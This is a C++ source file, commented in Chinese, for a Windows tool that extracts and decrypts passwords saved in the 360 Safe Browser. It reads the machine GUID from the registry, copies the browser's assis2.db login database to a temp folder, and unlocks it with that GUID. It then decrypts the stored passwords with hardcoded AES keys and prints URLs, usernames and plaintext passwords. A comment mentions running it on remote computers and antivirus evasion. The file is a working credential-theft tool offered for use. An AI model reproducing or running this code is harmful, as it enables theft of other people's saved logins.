#define _CRT_SECURE_NO_DEPRECATE
#ifndef SQLITE_HAS_CODEC
#define SQLITE_HAS_CODEC
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <iostream>
#include <vector>
#include  <io.h>        // _access
#include <shlobj.h>     // SHGetSpecialFolderPathA
#include "sqlite3.h"    // sqlite3的数据库解密
#include "aes.h"        // aes解密
#include "base64.h"     // base64解码
#define  SQLITE3_STATIC

#pragma comment(lib,"crypt32.lib")  // base64解码需要
using namespace std;



// 结果体：保存执行的sql语句结果
typedef struct _SQL_RESULT
{
    string domain;              // url
    string username;            // 用户名
    string encrypt_password;            // 加密的密码
    string password;      // 解密后的密码

}SQL_RESULT, * LPSQL_RESULT;

// 全局变量，保存所有结果
vector<_SQL_RESULT> g_vSqlResut;


// 判断文件是否存在
int isFileExist(const char * filePath)
{
    /* Check for existence */
    if ((_access(filePath, 0)) != -1)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}

// 将ANSI转换为Unicode
wchar_t* AnsiToUnicode(const char* str)
{
    int textlen;
    wchar_t* result;
    textlen = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    result = (wchar_t*)malloc((textlen + 1) * sizeof(wchar_t));
    memset(result, 0, (textlen + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, str, -1, (LPWSTR)result, textlen);
    return result;
}

// 将Unicode转换为ANSI
char* UnicodeToAnsi(const wchar_t* szStr)
{
    int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
    if (nLen == 0)
    {
        return NULL;
    }
    char* pResult = new char[nLen];
    WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
    return pResult;
}

// 读取注册表某个项的某个键的值
string RegQueryValueApi(HKEY hKey, const char* lpSubKeyG, const char* KeyValueG)
{
    
    HKEY hKeyResult = NULL;
    HKEY hKeyResultG = NULL;
    CHAR szLocation[MAX_PATH] = { '\0' };
    CHAR szLocationG[MAX_PATH] = { '\0' };
    DWORD dwSize = 0;
    DWORD dwSizeG = 0;
    DWORD dwDataType = 0;
    DWORD dwDataTypeG = 0;
    LONG ret = 0;
    LONG retG = 0;
    string value;

    if (ERROR_SUCCESS == RegOpenKeyExA(hKey, lpSubKeyG, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKeyResultG))
    {
        retG = RegQueryValueExA(hKeyResultG, KeyValueG, 0, &dwDataTypeG, NULL, &dwSizeG);
        // printf("RegQueryValueEx returns %d, dwSize=%d\n", retG, dwSizeG);

        retG = RegQueryValueExA(hKeyResultG, KeyValueG, 0, &dwDataTypeG, (LPBYTE)&szLocationG, &dwSizeG);
        // printf("RegQueryValueEx returns %d, dwSize=%d\n", retG, dwSizeG);

        if (ERROR_SUCCESS == ret)
        {
            // printf("Location: %s\n", szLocationG);
            value.append(szLocationG);
        }
        RegCloseKey(hKeyResultG);
    }

    return value;
}

// 执行sql语句
static int _callback_exec2(void* notused, int argc, char** argv, char** aszColName)
{
    printf("[+] url: %s\n", argv[0]);
    printf("[+] title: %s\n", argv[1]);

    return 0;
}

// 执行sql语句
static int _callback_exec(void* notused, int argc, char** argv, char** aszColName)
{
    
    SQL_RESULT SqlRet = {"", "", "", ""};
    SqlRet.domain = argv[0];
    SqlRet.username = argv[1];
    SqlRet.encrypt_password = argv[2];


    // printf("argc: %d\n", argc);
    

    /*
    printf("domain: %s\n", SqlRet.domain.data());
    printf("username: %s\n", SqlRet.username.data());
    printf("encrypt_password: %s\n", SqlRet.encrypt_password.data());
    */

    g_vSqlResut.push_back(SqlRet);

    
    
    printf("domain: %s\n", argv[0]);
    printf("username: %s\n", argv[1]);
    printf("password: %s\n", argv[2]);
    

    /*
    int i;
    for (i = 0; i < argc; i++)
    {
        printf("%s = %s\r\n", aszColName[i], argv[i] == 0 ? "NUL" : argv[i]);
    }
    */

    return 0;
}

// base64解码
LPBYTE Base64Decode(LPCSTR lpBase64Str, LPDWORD lpdwLen)
{
    DWORD dwLen;
    DWORD dwNeed;
    LPBYTE lpBuffer = NULL;

    dwLen = strlen(lpBase64Str);
    dwNeed = 0;
    CryptStringToBinaryA(lpBase64Str, 0, CRYPT_STRING_BASE64, NULL, &dwNeed, NULL, NULL);
    if (dwNeed)
    {
        lpBuffer = (LPBYTE)malloc(dwNeed);
        CryptStringToBinaryA(lpBase64Str, 0, CRYPT_STRING_BASE64, lpBuffer, &dwNeed, NULL, NULL);
        *lpdwLen = dwNeed;
    }

    return lpBuffer;
}


// 字符串转换为hash
void phex(uint8_t* str)
{

    unsigned char i;
    for (i = 0; i < 16; ++i)
        printf("%.2x", str[i]);
    printf("\n");
}

// aes的ecb模式解密
string decrypt_ecb(LPBYTE lpEncryptPassword, DWORD length, uint8_t key[])
{
    // szEncryptPassword 存储加密后的密码
    UCHAR szEncryptPassword[1024];
    ZeroMemory(szEncryptPassword, 1024);
    CopyMemory(szEncryptPassword, lpEncryptPassword, length);

    // 分块：每一块16个字节
    int num = length % 16 == 0 ? length / 16 : length / 16 + 1;
    // printf("num: %d\n", num);

    // 保存分块解密后的密码，并拼接到一起
    std::string aaa;
    aaa.clear();
    // 分块解密
    for (int i = 0; i < num; ++i)
    {
        // buffer： 保存每一块解密后的密码
        uint8_t buffer[17];
        ZeroMemory(buffer, 17);
        AES128_ECB_decrypt(szEncryptPassword + (i * 16), key, buffer);
        // 打印16进制的密码
        // phex(buffer);
        aaa.append((PCHAR)buffer);
    }

    // 获取密码的长度
    int aaa_size = aaa.size();
    // printf("%d\n", aaa_size);

    unsigned char i;
    char cPassword[1024];       // 保存解密后的密码
    ZeroMemory(cPassword, 1024);
    int j = 0;
    int k = 0;
    
    // phex((uint8_t*)aaa.data());
    // printf("%.2x\n", aaa.at(0));


    if (aaa.at(0) == '\x02') {
        for (i = 1; i < aaa.size(); ++i) {
            // 取偶数结果
            if (i % 2 != 0) {
                cPassword[j] = aaa.at(i);
                j += 1;
            }
        }
    }
    else {
        for (i = 1; i < aaa.size(); ++i) {
            // 取奇数结果
            if (i % 2 == 0) {
                cPassword[k] = aaa.at(i);
                k += 1;
            }
        }
    }
    /*
    for (i = 1; i < aaa.size(); ++i) {
        // 取偶数结果
        if (i % 2 != 0) {
            cPassword1[j] = aaa.at(i);
            j += 1;
        }
        // 取奇数结果
        else {
            cPassword2[k] = aaa.at(i);
            k += 1;
        }
    }
    */

    string szPassword = cPassword;
    return szPassword;


}

// 字符串分割
std::vector<std::string> splitString(const string strSrc, const string pattern)
{
    vector<string > resultstr;

    // 添加在字符串最后，可以截取最后一段数据
    std::string strcom = strSrc + pattern;
    auto pos = strSrc.find(pattern);
    auto len = strcom.size();

    //
    while (pos != std::string::npos)
    {
        std::string coStr = strcom.substr(0, pos);
        resultstr.push_back(coStr);

        strcom = strcom.substr(pos + pattern.size(), len);
        pos = strcom.find(pattern);
    }

    return resultstr;
}


VOID decrypt(string szMachineGuid, string dbPath)
{
    const char* sSQL;
    char* pErrMsg = 0;
    int ret = 0;
    sqlite3* db = 0;

    // 打开数据库
    ret = sqlite3_open(dbPath.data(), &db);

    // 解密第一层密码
    ret = sqlite3_key(db, szMachineGuid.data(), 36);

    sSQL = "select url, title from tb_favorite;";
    sqlite3_exec(db, sSQL, _callback_exec2, 0, &pErrMsg);
    printf("-----------------------------------------------------------------------------------\n");

    //取得数据并显示
    /*
        domain = 192.168.144.137
        username = admin
        password = (4B01F200ED01)3DY0nFhWSWeYn32rXHa3vRVe2VdNa4W3FozP3jSQTyQ=
    */
    sSQL = "select domain, username, password from tb_account;";
    sqlite3_exec(db, sSQL, _callback_exec, 0, &pErrMsg);
    printf("-----------------------------------------------------------------------------------\n");
    

    //关闭数据库
    sqlite3_close(db);
    db = 0;

    // 最后一层密钥：cf66fb58f5ca3485
    uint8_t key[] = { (uint8_t)0x63, (uint8_t)0x66, (uint8_t)0x36, (uint8_t)0x36, (uint8_t)0x66, (uint8_t)0x62, (uint8_t)0x35, (uint8_t)0x38, (uint8_t)0x66, (uint8_t)0x35, (uint8_t)0x63, (uint8_t)0x61, (uint8_t)0x33, (uint8_t)0x34, (uint8_t)0x38, (uint8_t)0x35 };


    // 遍历每一个结果
    for (int i = 0; i < g_vSqlResut.size(); i++)
    {
        // base64解码
        DWORD sDW = 0;              // 接收base64解码后的字符串的长度
        const char* cBase64EncodeEncryptPassword = g_vSqlResut[i].encrypt_password.data();      // base64编码后的密文：(4B01F200ED01)Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=
        // 将Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=解码，得到加密后的密码
        LPBYTE lpEncryptPassword = Base64Decode(splitString(cBase64EncodeEncryptPassword, ")")[1].data(), &sDW);   // splitString(cBase64EncodeEncryptPassword, ")")[1].data() 分割，将括号及里面的字符串删除

        // 解密
        string szPassword;
        szPassword = decrypt_ecb(lpEncryptPassword, sDW, key);
        g_vSqlResut[i].password = szPassword;

        printf("[+] url: %s\n", g_vSqlResut[i].domain.data());
        printf("[+] username: %s\n", g_vSqlResut[i].username.data());
        printf("[+] password: %s\n", g_vSqlResut[i].password.data());
        printf("-----------------------------------------------------------------------------------\n");
    }
}

// 未登录用户的情况下解密
int decryptNoUsers(string szMachineGuid, string sz360SafeBrowserInstallPath) {
    // 拼接360安全浏览器的assis2.db路径
    string sz360SafeBrowserDatabasePath;
    sz360SafeBrowserDatabasePath.append(sz360SafeBrowserInstallPath);
    sz360SafeBrowserDatabasePath.append("360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db");
    // printf("[+] 360 SafeBrowser database path : %s\n", sz360SafeBrowserDatabasePath.data());

    // 判断有没有数据库
    if (isFileExist(sz360SafeBrowserDatabasePath.data()))
    {
        printf("[+] No User Login. 360 SafeBrowser database path : %s\n", sz360SafeBrowserDatabasePath.data());
        printf("-----------------------------------------------------------------------------------\n");
    }
    else
    {
        printf("[-] No User Login. 360 SafeBrowser database not exist!\n");
        return 0;
    }

    // 将assis2.db复制到C:\windows\temp目录下
    // WCHAR wcSourcePath[] = L"C:\\Users\\asdf\\AppData\\Roaming\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db";
    WCHAR* wcSourcePath;
    wcSourcePath = AnsiToUnicode(sz360SafeBrowserDatabasePath.data());
    WCHAR wcDestPath[] = L"C:\\windows\\temp\\assis2.db";
    CopyFileW(wcSourcePath, wcDestPath, false);

    decrypt(szMachineGuid, "C:\\windows\\temp\\assis2.db");


    return 1;
}


// 解密登录了360用户的数据库
int decryptUsers(string szMachineGuid, string sz360SafeBrowserInstallPath, vector <string> vUserFolderName)
{
    for (auto x : vUserFolderName) {
        printf("-----------------------------------------------------------------------------------------\n");
        printf("User: %s\n", x.data());
        string szUserDataBasePath;      // 360用户的数据库
        szUserDataBasePath.append(sz360SafeBrowserInstallPath);
        szUserDataBasePath.append(x);
        szUserDataBasePath.append("\\assis2.db");
        printf("[+] user folder : %s \n", szUserDataBasePath.data());

        // 判断有没有数据库
        if (isFileExist(szUserDataBasePath.data()))
        {
            printf("[+] User Login. 360 SafeBrowser database path : %s\n", szUserDataBasePath.data());
        }
        else
        {
            printf("[-] User Login. 360 SafeBrowser database not exist!\n");
        }

        // 将assis2.db复制到C:\windows\temp目录下
        // WCHAR wcSourcePath[] = L"C:\\Users\\asdf\\AppData\\Roaming\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db";
        WCHAR* wcSourcePath;
        wcSourcePath = AnsiToUnicode(szUserDataBasePath.data());
        wstring wszDestPath;
        wszDestPath.append(L"C:\\windows\\temp\\");
        wszDestPath.append(AnsiToUnicode(x.data()));
        wszDestPath.append(L".db");
        wprintf(L"[+] copy database to %s\n", wszDestPath);
        CopyFileW(wcSourcePath, wszDestPath.data(), false);



        const char* sSQL;
        char* pErrMsg = 0;
        int ret = 0;
        sqlite3* db = 0;


        // 打开数据库
        ret = sqlite3_open(UnicodeToAnsi(wszDestPath.data()), &db);

        // 解密第一层密码
        ret = sqlite3_key(db, szMachineGuid.data(), 36);

        //取得数据并显示
        /*
            domain = 192.168.144.137
            username = admin
            password = (4B01F200ED01)3DY0nFhWSWeYn32rXHa3vRVe2VdNa4W3FozP3jSQTyQ=
        */
        sSQL = "select domain, username, password from tb_account;";
        sqlite3_exec(db, sSQL, _callback_exec, 0, &pErrMsg);

        //关闭数据库
        sqlite3_close(db);
        db = 0;


        // 遍历每一个结果
        for (int i = 0; i < g_vSqlResut.size(); i++)
        {
            // base64解码
            DWORD sDW = 0;              // 接收base64解码后的字符串的长度
            const char* cBase64EncodeEncryptPassword = g_vSqlResut[i].encrypt_password.data();      // base64编码后的密文：(4B01F200ED01)Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=
            // 将Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=解码，得到加密后的密码
            LPBYTE lpEncryptPassword = Base64Decode(splitString(cBase64EncodeEncryptPassword, ")")[1].data(), &sDW);   // splitString(cBase64EncodeEncryptPassword, ")")[1].data() 分割，将括号及里面的字符串删除

            // 如果用户登录，那么就先要第一层解密，用的密钥是ce156aa425cc4f41
            // 密钥1：ce156aa425cc4f41
            uint8_t key1[] = { (uint8_t)0x63, (uint8_t)0x65, (uint8_t)0x31, (uint8_t)0x35, (uint8_t)0x36, (uint8_t)0x61, (uint8_t)0x61, (uint8_t)0x34, (uint8_t)0x32, (uint8_t)0x35, (uint8_t)0x63, (uint8_t)0x63, (uint8_t)0x34, (uint8_t)0x66, (uint8_t)0x34, (uint8_t)0x31 };
            // 密钥2：cf66fb58f5ca3485
            uint8_t key2[] = { (uint8_t)0x63, (uint8_t)0x66, (uint8_t)0x36, (uint8_t)0x36, (uint8_t)0x66, (uint8_t)0x62, (uint8_t)0x35, (uint8_t)0x38, (uint8_t)0x66, (uint8_t)0x35, (uint8_t)0x63, (uint8_t)0x61, (uint8_t)0x33, (uint8_t)0x34, (uint8_t)0x38, (uint8_t)0x35 };
            // 密钥2：10a21c75b35e444f
            uint8_t key3[] = { (uint8_t)0x31, (uint8_t)0x30, (uint8_t)0x61, (uint8_t)0x32, (uint8_t)0x31, (uint8_t)0x63, (uint8_t)0x37, (uint8_t)0x35, (uint8_t)0x62, (uint8_t)0x33, (uint8_t)0x35, (uint8_t)0x65, (uint8_t)0x34, (uint8_t)0x34, (uint8_t)0x34, (uint8_t)0x66 };

            // 解密
            string szPassword1;
            string szPassword2;
            szPassword1 = decrypt_ecb(lpEncryptPassword, sDW, key1);
            printf("szPassword1: %s\n", szPassword1.data());
            LPBYTE lpEncryptPassword2 = Base64Decode(splitString(szPassword1, ")")[1].data(), &sDW);   // splitString(cBase64EncodeEncryptPassword, ")")[1].data() 分割，将括号及里面的字符串删除
            szPassword2 = decrypt_ecb(lpEncryptPassword2, sDW, key2);
            g_vSqlResut[i].password = szPassword2;

            printf("[+] url: %s\n", g_vSqlResut[i].domain.data());
            printf("[+] username: %s\n", g_vSqlResut[i].username.data());
            printf("[+] password: %s\n", g_vSqlResut[i].password.data());
            
        }

        printf("-----------------------------------------------------------------------------------\n");
    }






    return 1;
}



// 列出登录用户的专属文件夹名
vector <string> listUsersFolder(char* path)
{
    vector <string> vUserFolderName;
    char findPath[100];
    ZeroMemory(findPath, 100);
    strcpy(findPath, path);
    strcat(findPath, "*.*");
    struct _finddata_t data;
    long hnd = _findfirst(findPath, &data);    // 查找文件名与正则表达式chRE的匹配第一个文件
    if (hnd < 0)
    {
        perror(findPath);
    }
    int  nRet = (hnd < 0) ? -1 : 1;
    while (nRet >= 0)
    {
        // 如果是目录
        if (data.attrib == _A_SUBDIR)
        {
            string foldName;
            foldName = data.name;
            // printf("[%s] : [%d]\n", foldName.data(), foldName.size());

            if (foldName.size() == 32)
            {
                // printf("[%s] : [%d]\n", foldName.data(), foldName.size());
                vUserFolderName.push_back(foldName.data());
                /*
                string szUserDataBasePath;      // 360用户的数据库
                szUserDataBasePath.append(path);
                szUserDataBasePath.append(foldName);
                szUserDataBasePath.append("\\assis2.db");
                printf("user folder : %s \n", szUserDataBasePath.data());
                vUserDataBasePath.push_back(szUserDataBasePath);
                */
            }

        }


        nRet = _findnext(hnd, &data);
    }
    _findclose(hnd);     // 关闭当前句柄
    return vUserFolderName;
}

int main(int argc, char* argv[])
{
    printf("Usage: %s <szMachineGuid> <dbPath>\n", argv[0]);
    printf("Usage: 360SafeBrowserDecrypt.exe xxxxxx-xxxx-xxxx-xxxx-xxxxxxxxx assis2.db\n");

    // 将文件拖到本地解密，需要得到机器账户id和assis2.db数据库
    if (argc == 3) {
        printf("       %s %s %s\n", argv[0], argv[1], argv[2]);
        string szMachineGuid = argv[1];
        string dbPath = argv[2];
        printf("szMachineGuid: %s\ndbPath: %s\n", szMachineGuid.data(), dbPath.data());
        decrypt(szMachineGuid, dbPath);
    }
    // 远程计算机解密，可能不免杀
    else {
        // 读取MachineGuid
        HKEY hKey = HKEY_LOCAL_MACHINE;
        const char* lpSubKeyG = "SOFTWARE\\MICROSOFT\\CRYPTOGRAPHY";
        const char* KeyValueG = "MachineGuid";
        string szMachineGuid;
        szMachineGuid = RegQueryValueApi(hKey, lpSubKeyG, KeyValueG);
        printf("[+] MachineGuid: %s\n", szMachineGuid.data());


        // 获取360安全浏览器exe的运行路径，从注册表里获取    HKEY_CLASSES_ROOT\360SeSES的默认值
        string sz360SafeBrowserExePath;
        sz360SafeBrowserExePath = RegQueryValueApi(HKEY_CLASSES_ROOT, "360SeSES\\DefaultIcon", "");
        // 通过分割获取360安全浏览器的安装目录
        // printf("[+] 360 SafeBrowser install path : %s\n", sz360SafeBrowserExePath.data());
        // const CHAR c360SafeBrowserInstallPath;
        string sz360SafeBrowserInstallPath;
        sz360SafeBrowserInstallPath = splitString(sz360SafeBrowserExePath.data(), "360se6")[0];
        printf("[+] 360 SafeBrowser install path : %s\n", sz360SafeBrowserInstallPath.data());

        // 解密没有用户登录的数据库
        decryptNoUsers(szMachineGuid, sz360SafeBrowserInstallPath);

        /*
        // 解密登录了360用户的数据库
        vector <string> vUserFolderName;
        vUserFolderName = listUsersFolder((char*)sz360SafeBrowserInstallPath.append("360se6\\User Data\\Default\\").data());
        decryptUsers(szMachineGuid, sz360SafeBrowserInstallPath, vUserFolderName);
        */
    }
    

    return 0;
}